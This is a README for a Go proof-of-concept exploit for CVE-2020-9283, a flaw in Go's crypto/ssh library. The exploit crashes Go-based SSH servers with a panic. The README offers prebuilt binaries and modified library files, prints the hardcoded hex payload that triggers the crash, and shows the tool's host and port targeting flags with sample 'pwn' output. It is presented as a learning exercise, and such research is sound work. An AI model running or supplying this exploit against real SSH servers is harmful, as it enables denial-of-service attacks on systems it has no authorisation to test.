# Exploit for CVE-2020-9283  

This project is inspired by the original POC found here github.com/mark-adams/exploits/CVE-2020-9283.
I was curious as to how the Go SSH library was implemented so decided to implement the PoC using go.

A short writeup can be found here https://dev.to/brompwnie/modifying-go-s-crypto-ssh-library-for-cve-2020-9283-26a7

# What does this do?

This invokes a panic on a Go based SSH server which may lead to a DoS. 

# Installation

I've released binaries in the Release section however you can rebuild your own using the source code attached.

## Building the sources
I decided to modify the Go crypto library directly on my system to understand how it works, this is not ideal and probably not the best way to do this but it works ;) If you want to rebuild using GO modules, replace the contents of the Crypto/ssh files client_auth.go, handshake.go, transport.go on your local system with the ".bak" files located here. These modified files contain verbose debugging output and a hardcoded payload of "0000000b7373682d65643235353139000000156161612d616161612d61612d6161612d6161616161" which triggers the panic.

# Usage
You will see lots of debugging output and "errors", this is expected. If your target has panic'd, you should see errors associated to "bad key lengths". If you want to test this locally, use the vulnerable code that can be found here github.com/mark-adams/exploits/CVE-2020-9283

```
# ./CVE-2020-9283 -h
Usage of ./CVE-2020-9283:
  -host string
        IP address of SSH host to target (default "localhost")
  -key string
        ssh-ed25519 private key to use (default "thekey")
  -port string
        Port to target (default "22")

# ./CVE-2020-9283 -port=2022
./CVE-2020-9283 -port=2022
+] Sploit for CVE-2020-9283
[+] Attempting to pwn: localhost:2022
[!] Attempting: cMSG_USERAUTH_REQUEST
[+] userAuthRequestMsg User:  notme
[+] userAuthRequestMsg Service:  ssh-connection
[ERROR] ssh: handshake failed: EOF
[+] This should have invoked a panic on the SSH target i.e 'panic: ed25519: bad public key length'

```
